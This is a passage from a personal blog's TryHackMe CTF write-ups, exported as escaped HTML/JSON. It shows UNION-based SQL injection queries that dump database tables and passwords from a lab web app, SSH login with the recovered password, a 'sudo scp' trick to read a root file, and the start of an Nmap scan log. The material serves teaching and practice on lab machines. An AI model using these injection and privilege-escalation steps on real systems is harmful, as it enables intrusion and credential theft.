/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This reveals some interesting directories:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/assets is unsecured and contains site assets, and reveals that we’re running Apache 2.4.18 on Ubuntu.&lt;/li&gt;\n&lt;li&gt;/delete is a plain text file: “New priv esc for Ubuntu?? Change &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt; password on main system!”&lt;/li&gt;\n&lt;li&gt;/server-status is forbidden (which is not surprising).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Out of curiosity, I tried loading &lt;code&gt;/item.php?id=robots.txt&lt;/code&gt; to see if I could get file inclusion without ascending. This doesn’t work, but throws another SQL error: “Unknown column ‘robots.txt in ‘where clause’”. This indicates that we’re definitely vulnerable to some kind of injection, since robots.txt is being treated as a column spec. In fact, this indicates that there must not be any quoting going on at all!&lt;/p&gt;\n&lt;p&gt;And indeed, trying &lt;code&gt;/item.php?id=0 or 1=1&lt;/code&gt; brings up the same broken page as &lt;code&gt;/item.php?id=100&lt;/code&gt;. So I think what’s going on here is that /item.php is just doing some string filtering (it looks like it’s probably also checking if you’re trying to include a real file, as attempting to include non-existent files &lt;em&gt;doesn’t&lt;/em&gt; trigger it).&lt;/p&gt;\n&lt;p&gt;What the hell, let’s throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SQLMap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQLMap&quot;&gt;SQLMap&lt;/a&gt; at it anyway!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sqlmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.105.134/item.php?id=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       --dbms=mysql&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --dump-all&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --batch&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Well, that didn’t work.&lt;/p&gt;\n&lt;p&gt;Meanwhile, futzing around by hand I find that &lt;code&gt;/item.php?id=0 union select null, null, null, null, null&lt;/code&gt; works and displays a slightly &lt;em&gt;different&lt;/em&gt; error page (so, whatever the &lt;code&gt;id&lt;/code&gt; variable is being pushed into must be at the very end of the SQL statement). And, while “&lt;code&gt;&#039;&lt;/code&gt;” triggers the annoying error page, using a double quote (“&lt;code&gt;&quot;&lt;/code&gt;”) does not.  Using a bit of trial-and error, we can determine that all but the first of these columns are usable, though the fourth place is easiest to read. This at least let’s us figure out our first few flags.&lt;/p&gt;\n&lt;p&gt;The database also appears to be running as root. Ruh roh!&lt;/p&gt;\n&lt;p&gt;Now that we’re getting the hang of this, we can extract more information by using queries of the form: &lt;code&gt;/item.php?id=0 union (select null, null, null, &quot;something&quot;, null)&lt;/code&gt;. I’m going to focus on the actual SQL inside of these parenthesis.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; mysql&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;user&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;We have four users. We can enumerate them by replacing &lt;code&gt;count(*)&lt;/code&gt; with &lt;code&gt;User&lt;/code&gt; and tacking on a &lt;code&gt;limit&lt;/code&gt; clause; this just reveals that the only users are root and three standard Debian system users that are used for upgrades and maintenance.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This reveals that there are 282 tables managed by this &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt; instance (ouch!). But how many tables are in the &lt;code&gt;park&lt;/code&gt; database (which is what’s serving up this site)?&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Only two. That seems much better. I wonder what they are?&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, table_name, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;So we have two tables, &lt;code&gt;items&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt;. Let’s see what the columns of the &lt;code&gt;users&lt;/code&gt; table are.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, column_name, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;columns&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tand&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; table_name &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;users&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;So, the columns are &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;username&lt;/code&gt;, and &lt;code&gt;password&lt;/code&gt;. Nice. Let’s dig into that table.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;users&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Unfortunately, trying to include the &lt;code&gt;username&lt;/code&gt; column triggers the annoying error, so all we can retrieve are two passwords, &lt;code&gt;D0nt3ATM3&lt;/code&gt; and &lt;code&gt;ih8dinos&lt;/code&gt;. Just for grins (and clued in by the structure of the flag questions), let’s see if we can &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; into the box as either of these using the user dennis.&lt;/p&gt;\n&lt;p&gt;The second works for this purpose, and the first flag is right in dennis’ home directory.&lt;/p&gt;\n&lt;p&gt;Poking around a bit, &lt;code&gt;sudo -l&lt;/code&gt; reveals that dennis can use scp via &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;, and the test.sh file implies that there’s a /root/flag5.txt file. Since scp works like cp for local copies, we can grab this.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; scp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /root/flag5.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; flag5.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Continuing to poke around, &lt;code&gt;cat .bash_history&lt;/code&gt; reveals the third flag (as well as a lot of scp attempts around /root/flag5.txt, which I just got).&lt;/p&gt;\n&lt;p&gt;The ~/.viminfo file reveals two more potential flags: /boot/grub/fonts/flagTwo.txt and /tmp/flagFour.txt.&lt;/p&gt;\n&lt;p&gt;But, as the TryHackMe room notes, there is no fourth flag.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 53 min&lt;/p&gt;","rssInclude":true},"journals/2022-04-03":{"slug":"journals/2022-04-03","filePath":"journals/2022-04-03.md","title":"Net sec challenge","links":["spells/Nmap","spells/Hydra","spells/netcat","spells/FTP"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Net Sec Challenge” on TryHackMe\n\n\n\nThis CTF is just a series of questions. All should be solvable using Nmap, telnet, and Hydra… Though I’m going to substitute netcat for telnet. However, I’m sticking to the spirit of things, and will only use those three tools.\nThe target machine is 10.10.152.115.\nWe’ll start off with a full Nmap scan:\nsudo nmap -v -oN net-sec-challenge -Pn -A --reason -T4 \\\n          -p- 10.10.152.115\nResults:\n# Nmap 7.92 scan initiated Sun Apr  3 20:48:04 2022 as: nmap -v -oN net-sec-challenge -Pn -A --reason -T4 -p- 10.10.152.115\nIncreasing send delay for 10.10.152.115 from 0 to 5 due to 909 out of 2271 dropped probes since last increase.\nIncreasing send delay for 10.10.152.115 from 5 to 10 due to 11 out of 15 dropped probes since last increase.\nNmap scan report for 10.10.152.115\nHost is up, received user-set (0.19s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT      STATE SERVICE     REASON         VERSION\n22/tcp    open  ssh         syn-ack ttl 61 (protocol 2.0)\n| ssh-hostkey: \n|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)\n|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)\n|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}\n80/tcp    open  http        syn-ack ttl 61 lighttpd\n|_http-server-header: lighttpd THM{web_server_25352}\n| http-methods: \n|_  Supported Methods: OPTIONS GET HEAD POST\n|_http-title: Hello, world!\n139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2\n445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2\n8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)\n|_http-title: Site doesn&#039;t have a title (text/html; charset=utf-8).\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at nmap.org/cgi-bin/submit.cgi :\nSF-Port22-TCP:V=7.92%I=7%D=4/3%Time=624A60E5%P=x86_64-pc-linux-gnu%r(NULL,\nSF:29,&quot;SSH-2\\.0-OpenSSH_8\\.2p1 THM{946219583339}\n&quot;);\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=32245%PV=Y%DS=4%DC=T%G=Y%TM=624A6111\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nUptime guess: 12.801 days (since Tue Mar 22 01:54:39 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=260 